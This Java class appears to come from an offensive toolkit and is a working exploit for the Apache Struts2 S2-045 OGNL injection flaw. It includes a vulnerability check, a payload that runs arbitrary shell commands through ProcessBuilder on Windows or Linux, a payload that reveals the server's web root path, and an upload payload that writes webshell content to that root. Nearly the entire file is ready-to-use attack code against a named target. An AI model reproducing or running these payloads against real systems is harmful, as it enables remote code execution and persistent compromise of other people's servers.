package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_045 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private String check_payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('8848')).(#res.getWriter().print('UUID')).(#res.getWriter().flush()).(#res.getWriter().close())}";

    private String payload = "%{(#nike333='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='payload').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

    private String webPath = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('')).(#res.getWriter().print('')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().flush()).(#res.getWriter().close())}";
    @Override
    public boolean checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();
        try {
            String data = this.check_payload.replace("UUID", uuid);
            String result = HttpTool.postHttpReuest(this.target, data, "", "UTF-8");
            boolean flag = result.contains(uuid);
            if(flag) {
                this.isVul = true;
            }
            return flag;
        } catch (Exception e) {
            logger.error(e);
        }
        return false;
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        try {
            String data = payload.replace("payload", cmd);
            String result = HttpTool.postHttpReuest(this.target, data, "", encoding);
            return result;

        } catch (Exception e) {
            logger.error(e);
        }
        return "fail";
    }

    @Override
    public String getWebPath() {
        try {
            String result = HttpTool.postHttpReuest(this.target, webPath, "", "UTF-8");
            return result;

        } catch (Exception e) {
            logger.error(e);
        }
        return "命令执行失败";
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        String payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=(@org.apache.struts2.ServletActionContext@getRequest())).(#path1=#req.getRealPath('/')).(#sb=(new java.lang.StringBuilder(#path1))).(#path=#sb.append('/SHELLPATH')).(#shell='SHELLContent').(#file=new java.io.File(#path)).(#fw=new java.io.FileWriter(#file)).(#fw.write(#shell)).(#fw.flush()).(#fw.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.write(\"88348\")).(#ros.write(\"qqqqqthjsj\")).(#ros.flush())}";

        payload = payload.replace("SHELLPATH", filename).replace("SHELLContent", fileContent);

        String result = HttpTool.postHttpReuest(this.target, payload, "", "UTF-8");

        if(result.contains("88348qqqqqthjsj")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
